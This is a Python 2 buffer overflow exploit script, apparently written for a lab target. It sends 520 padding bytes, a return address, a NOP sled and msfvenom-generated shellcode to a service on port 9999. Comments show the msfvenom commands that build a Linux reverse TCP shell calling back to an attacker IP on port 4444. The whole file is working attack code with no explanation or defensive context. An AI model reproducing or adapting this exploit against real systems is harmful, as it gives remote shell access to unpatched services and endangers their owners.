#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys,socket

#msfvenom -p linux/shell_reverse_tcp LHOST=your.Kali.IP.address LPORT=4444 EXITFUNC=thread -f c -a x86 –platform linux -b “\x00”
#/home/anansi/bin/anansi_util
#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.31.148 LPORT=4444 EXITFUNC=thread –e x86/alpha_upper –b “\x00” -f c 
            
overflow= ("\xdb\xd8\xd9\x74\x24\xf4\xba\x0a\x7f\x64\xf7\x58\x31\xc9\xb1"
"\x1f\x83\xe8\xfc\x31\x50\x16\x03\x50\x16\xe2\xff\x15\x6e\xa9"
"\xce\x32\x99\xb6\x63\x86\x35\x53\x81\xb8\xdc\x2a\x64\x75\xa0"
"\xba\x3d\xee\x61\x6c\xde\x7a\x09\x6f\xe0\x87\xf3\xe6\x01\xed"
"\x65\xa1\x91\xa3\x3e\xd8\xf0\x07\x0c\x5a\x77\x47\xf7\x42\x39"
"\x3c\x35\x1d\x67\xbc\x45\xdd\x3f\xd7\x45\xb7\xba\xae\xa5\x76"
"\x0d\x7d\xa9\xfc\x4d\x07\x17\x15\x6a\x4a\x60\x53\x74\xba\x6f"
"\xa3\xfd\x59\xae\x48\xf1\x5c\xd2\x83\xb9\x22\xd8\x1c\x3c\x1c"
"\x9a\x0c\x65\x14\xba\xb4\x2f\x2a\x8d\xc4\x82\xb3\x68\x0a\x64"
"\xb6\x8d\x6a\x2c\xb7\x71\x6d\x4c\x03\x70\x6d\x4c\x73\xbe\xed")

shell = "A" * 520 + "\xf3\x12\x17\x31" + "\x90" * 16 + overflow


try: 
				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
                                s.connect(('192.168.31.149', 9999)) 
				
				s.send(( '/r/n' + shell))  
				s.close()  
			     
except : 
                		print "error in connection"
				sys.exit()
